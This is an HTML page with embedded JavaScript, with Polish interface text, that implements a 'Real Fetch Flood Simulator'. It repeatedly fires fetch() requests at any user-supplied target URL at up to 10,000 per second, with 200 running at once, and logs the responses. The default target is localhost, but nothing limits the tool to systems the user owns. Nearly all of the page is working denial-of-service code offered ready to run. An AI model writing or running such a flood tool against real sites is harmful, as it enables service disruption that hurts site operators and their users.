<!DOCTYPE html>
<html lang="pl">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>Real Fetch Flood (safe limit)</title>
<style>
  body {
    background:#111;
    color:#0f0;
    font-family: monospace, monospace;
    padding: 20px;
  }
  input[type=range] {
    width: 300px;
  }
  #log {
    background: #222;
    color: #0f0;
    font-size: 14px;
    height: 250px;
    overflow-y: auto;
    padding: 10px;
    border-radius: 6px;
    margin-top: 10px;
  }
  #stats {
    margin-top: 10px;
    font-size: 18px;
  }
  button {
    margin-left: 10px;
    background: #0a0;
    border: none;
    color: #000;
    font-weight: bold;
    padding: 6px 12px;
    cursor: pointer;
    border-radius: 4px;
  }
  label {
    display: inline-block;
    margin-bottom: 6px;
  }
  input, select {
    font-size: 16px;
    padding: 6px;
    border-radius: 4px;
    border: none;
    background: #222;
    color: #0f0;
    width: 320px;
  }
</style>
</head>
<body>

<h2>Real Fetch Flood Simulator (max 200 RPS concurrency)</h2>

<label for="target">Target URL:</label><br/>
<input id="target" type="text" value="http://localhost:3000" /><br/><br/>

<label for="rate">Bots per second (1â€“10000): <span id="rateVal">1</span></label><br/>
<input type="range" id="rate" min="1" max="10000" value="1" step="1"/><br/><br/>

<button id="startBtn">Start</button>
<button id="stopBtn" disabled>Stop</button>

<div id="stats">
  Sent: <span id="sentCount">0</span><br/>
  Active requests: <span id="activeCount">0</span>
</div>

<div id="log" aria-live="polite"></div>

<script>
  const targetInput = document.getElementById('target');
  const rateInput = document.getElementById('rate');
  const rateVal = document.getElementById('rateVal');
  const startBtn = document.getElementById('startBtn');
  const stopBtn = document.getElementById('stopBtn');
  const sentCount = document.getElementById('sentCount');
  const activeCount = document.getElementById('activeCount');
  const log = document.getElementById('log');

  let botsPerSecond = Number(rateInput.value);
  let sentPackets = 0;
  let activeRequests = 0;
  let intervalId = null;
  let maxConcurrency = 200;
  let requestQueue = [];

  rateInput.addEventListener('input', () => {
    botsPerSecond = Number(rateInput.value);
    rateVal.textContent = botsPerSecond.toLocaleString();
  });

  function appendLog(msg) {
    const now = new Date().toLocaleTimeString();
    const div = document.createElement('div');
    div.textContent = `[${now}] ${msg}`;
    log.appendChild(div);
    log.scrollTop = log.scrollHeight;
  }

  async function doFetch(url) {
    activeRequests++;
    activeCount.textContent = activeRequests;
    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 5000);
    let statusText = 'error';

    try {
      const res = await fetch(url, {signal: controller.signal});
      clearTimeout(timeout);
      statusText = `${res.status} ${res.statusText}`;
      sentPackets++;
      sentCount.textContent = sentPackets.toLocaleString();
      appendLog(`Request succeeded: ${statusText}`);
    } catch (e) {
      appendLog(`Request failed: ${e.name} ${e.message}`);
    } finally {
      activeRequests--;
      activeCount.textContent = activeRequests;
    }
  }

  function trySend() {
    while (activeRequests < maxConcurrency && requestQueue.length > 0) {
      const url = requestQueue.shift();
      doFetch(url);
    }
  }

  function startFlood() {
    if(intervalId) return;
    appendLog(`Starting flood at ${botsPerSecond} req/s to ${targetInput.value}`);
    startBtn.disabled = true;
    stopBtn.disabled = false;
    sentPackets = 0;
    sentCount.textContent = '0';

    intervalId = setInterval(() => {
      for(let i = 0; i < botsPerSecond; i++) {
        requestQueue.push(targetInput.value);
      }
      trySend();
    }, 1000);
  }

  function stopFlood() {
    if(!intervalId) return;
    clearInterval(intervalId);
    intervalId = null;
    startBtn.disabled = false;
    stopBtn.disabled = true;
    appendLog('Flood stopped.');
  }

  startBtn.addEventListener('click', () => {
    if(!targetInput.value.trim()) {
      alert('Podaj URL celu.');
      return;
    }
    startFlood();
  });
  stopBtn.addEventListener('click', stopFlood);

</script>

</body>
</html>
